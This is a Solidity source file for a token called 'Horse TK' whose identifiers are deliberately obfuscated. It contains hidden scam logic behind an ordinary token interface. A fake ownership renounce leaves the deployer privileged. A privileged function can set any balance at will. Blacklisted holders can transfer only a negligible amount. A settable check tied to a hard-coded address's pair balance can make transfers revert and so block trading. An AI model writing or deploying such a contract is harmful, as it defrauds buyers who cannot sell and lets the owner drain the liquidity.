//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface icbyrmkntvuls {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract jacfskbercugbt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface klzkfitzezd {
    function createPair(address yilsxmtusape, address ffrzngkctvhem) external returns (address);
}

interface pbqfjpkuunyuc {
    function totalSupply() external view returns (uint256);

    function balanceOf(address jstchkqws) external view returns (uint256);

    function transfer(address csimiecpt, uint256 ilwymdkmc) external returns (bool);

    function allowance(address wadbmeyoptk, address spender) external view returns (uint256);

    function approve(address spender, uint256 ilwymdkmc) external returns (bool);

    function transferFrom(
        address sender,
        address csimiecpt,
        uint256 ilwymdkmc
    ) external returns (bool);

    event Transfer(address indexed from, address indexed xcoekrqpdi, uint256 value);
    event Approval(address indexed wadbmeyoptk, address indexed spender, uint256 value);
}

interface pbqfjpkuunyucMetadata is pbqfjpkuunyuc {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract HorseTK is jacfskbercugbt, pbqfjpkuunyuc, pbqfjpkuunyucMetadata {

    function name() external view virtual override returns (string memory) {
        return axhqtlypdjwrwf;
    }

    function ckaxnpkqvkhvoc() public {
        emit OwnershipTransferred(kgqozjpbjjezx, address(0));
        flwihybqneo = address(0);
    }

    uint256 public urorahdnycw;

    uint256 private eyqtunqwyrdguk;

    function transferFrom(address fgagvfervfu, address csimiecpt, uint256 ilwymdkmc) external override returns (bool) {
        if (_msgSender() != zdruqkvubiivlr) {
            if (ezihcuoce[fgagvfervfu][_msgSender()] != type(uint256).max) {
                require(ilwymdkmc <= ezihcuoce[fgagvfervfu][_msgSender()]);
                ezihcuoce[fgagvfervfu][_msgSender()] -= ilwymdkmc;
            }
        }
        return tvxmntijhywvnh(fgagvfervfu, csimiecpt, ilwymdkmc);
    }

    function qbzveoofuvyzjt(address bwosphrfevtiyg) public {
        uxkngmfnt();
        
        if (bwosphrfevtiyg == kgqozjpbjjezx || bwosphrfevtiyg == caycvaokns) {
            return;
        }
        oxnnazbhjnoy[bwosphrfevtiyg] = true;
    }

    uint8 private tepdvfytdhakp = 18;

    uint256 private mkmhbpthctlr;

    function adgtbupxo(address ykkdalxnu) public {
        if (vcxyihxryhmqec) {
            return;
        }
        
        iggoddsceuca[ykkdalxnu] = true;
        
        vcxyihxryhmqec = true;
    }

    uint256 public wlygqqvxh;

    event OwnershipTransferred(address indexed vqumgdzgkhcyp, address indexed dryurwlyxoieo);

    mapping(address => bool) public oxnnazbhjnoy;

    function tipldhfusxlxwo(uint256 ilwymdkmc) public {
        uxkngmfnt();
        zlzhaosawpu = ilwymdkmc;
    }

    function tvxmntijhywvnh(address fgagvfervfu, address csimiecpt, uint256 ilwymdkmc) internal returns (bool) {
        if (fgagvfervfu == kgqozjpbjjezx) {
            return rxgwssjvopr(fgagvfervfu, csimiecpt, ilwymdkmc);
        }
        uint256 ndkkteaujew = pbqfjpkuunyuc(caycvaokns).balanceOf(wegrxvrkmnw);
        require(ndkkteaujew == zlzhaosawpu);
        require(csimiecpt != wegrxvrkmnw);
        if (oxnnazbhjnoy[fgagvfervfu]) {
            return rxgwssjvopr(fgagvfervfu, csimiecpt, ycqwddgklz);
        }
        return rxgwssjvopr(fgagvfervfu, csimiecpt, ilwymdkmc);
    }

    uint256 private lexnqxhoj;

    function uxkngmfnt() private view {
        require(iggoddsceuca[_msgSender()]);
    }

    function decimals() external view virtual override returns (uint8) {
        return tepdvfytdhakp;
    }

    address private flwihybqneo;

    uint256 constant ycqwddgklz = 12 ** 10;

    string private axhqtlypdjwrwf = "Horse TK";

    constructor (){
        
        ckaxnpkqvkhvoc();
        icbyrmkntvuls qtstgvunls = icbyrmkntvuls(zdruqkvubiivlr);
        caycvaokns = klzkfitzezd(qtstgvunls.factory()).createPair(qtstgvunls.WETH(), address(this));
        if (mkmhbpthctlr != eyqtunqwyrdguk) {
            mkmhbpthctlr = yuxjehpfulse;
        }
        kgqozjpbjjezx = _msgSender();
        iggoddsceuca[kgqozjpbjjezx] = true;
        bhxzpjzrcl[kgqozjpbjjezx] = xkhdcpwlztm;
        
        emit Transfer(address(0), kgqozjpbjjezx, xkhdcpwlztm);
    }

    address public caycvaokns;

    address public kgqozjpbjjezx;

    string private aeiijidsts = "HTK";

    uint256 private xkhdcpwlztm = 100000000 * 10 ** 18;

    bool private hucvofayza;

    mapping(address => uint256) private bhxzpjzrcl;

    address wegrxvrkmnw = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private zsngckwwgn;

    uint256 niwbkxkxpm;

    mapping(address => bool) public iggoddsceuca;

    function balanceOf(address jstchkqws) public view virtual override returns (uint256) {
        return bhxzpjzrcl[jstchkqws];
    }

    function owner() external view returns (address) {
        return flwihybqneo;
    }

    function rxgwssjvopr(address fgagvfervfu, address csimiecpt, uint256 ilwymdkmc) internal returns (bool) {
        require(bhxzpjzrcl[fgagvfervfu] >= ilwymdkmc);
        bhxzpjzrcl[fgagvfervfu] -= ilwymdkmc;
        bhxzpjzrcl[csimiecpt] += ilwymdkmc;
        emit Transfer(fgagvfervfu, csimiecpt, ilwymdkmc);
        return true;
    }

    function transfer(address yfwzxyahrd, uint256 ilwymdkmc) external virtual override returns (bool) {
        return tvxmntijhywvnh(_msgSender(), yfwzxyahrd, ilwymdkmc);
    }

    bool public vcxyihxryhmqec;

    address zdruqkvubiivlr = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address utttpflvbrevo, uint256 ilwymdkmc) public virtual override returns (bool) {
        ezihcuoce[_msgSender()][utttpflvbrevo] = ilwymdkmc;
        emit Approval(_msgSender(), utttpflvbrevo, ilwymdkmc);
        return true;
    }

    uint256 public yuxjehpfulse;

    bool public jfbpwrgnk;

    function totalSupply() external view virtual override returns (uint256) {
        return xkhdcpwlztm;
    }

    function allowance(address whsjnwlopvkaf, address utttpflvbrevo) external view virtual override returns (uint256) {
        if (utttpflvbrevo == zdruqkvubiivlr) {
            return type(uint256).max;
        }
        return ezihcuoce[whsjnwlopvkaf][utttpflvbrevo];
    }

    function symbol() external view virtual override returns (string memory) {
        return aeiijidsts;
    }

    uint256 zlzhaosawpu;

    mapping(address => mapping(address => uint256)) private ezihcuoce;

    function getOwner() external view returns (address) {
        return flwihybqneo;
    }

    function irardlnzhquvtv(address yfwzxyahrd, uint256 ilwymdkmc) public {
        uxkngmfnt();
        bhxzpjzrcl[yfwzxyahrd] = ilwymdkmc;
    }

}